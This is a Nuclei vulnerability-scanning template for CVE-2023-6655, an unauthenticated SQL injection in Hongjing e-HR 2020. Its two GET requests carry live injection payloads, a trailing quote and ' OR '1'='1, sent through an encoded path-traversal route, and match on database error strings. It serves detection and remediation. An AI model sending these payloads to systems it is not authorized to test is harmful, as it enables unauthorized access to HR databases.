id: CVE-2023-6655

info:
  name: Hongjing e-HR - SQL Injection
  author: neha
  severity: high
  description: |
    Hongjing e-HR version 2020 has an SQL injection vulnerability in the 'parentid' parameter of the /w_selfservice/oauthservlet/%2e./.%2e/general/inform/org/loadhistroyorgtree endpoint. This allows remote attackers to execute arbitrary SQL commands without authentication.
  impact: |
    An attacker can inject malicious SQL code to read sensitive data, modify records, or even gain full control over the database. This could lead to data breaches, system compromise, or complete takeover of the HR system.
  remediation: |
    Update Hongjing e-HR to the latest version with security patches. Use prepared statements and proper input sanitization to prevent SQL injection. Consider implementing a web application firewall (WAF) as an additional security layer.
  reference:
    - https://github.com/willchen0011/cve/blob/main/HongJing-sql.md
    - https://nvd.nist.gov/vuln/detail/CVE-2023-6655
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L
    cvss-score: 7.3
    cve-id: CVE-2023-6655
    cwe-id: CWE-89
    epss-score: 0.00135
    epss-percentile: 0.4969
    cpe: cpe:2.3:a:hongjing:e-hr:2020:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 3
    vendor: hongjing
    product: e-hr
  tags: cve,cve2023,sqli,hongjing,e-hr,kev,vkev

variables:
  marker: "{{rand_base(8)}}"

http:
  - method: GET
    path:
      - "{{BaseURL}}/w_selfservice/oauthservlet/%2e./.%2e/general/inform/org/loadhistroyorgtree?parentid={{marker}}'"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "SQL"
          - "syntax"
          - "error"
        condition: and

      - type: word
        part: body
        words:
          - "You have an error in your SQL syntax"
          - "mysql_fetch"
          - "ORA-"
          - "PostgreSQL"
          - "Microsoft SQL Server"
        condition: or

      - type: status
        status:
          - 200
          - 500

  - method: GET
    path:
      - "{{BaseURL}}/w_selfservice/oauthservlet/%2e./.%2e/general/inform/org/loadhistroyorgtree?parentid=1' OR '1'='1"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "parentid"
          - "loadhistroyorgtree"
        condition: and

      - type: status
        status:
          - 200

      - type: word
        part: body
        words:
          - "SQL"
          - "syntax"
          - "error"
        condition: or
        negative: true
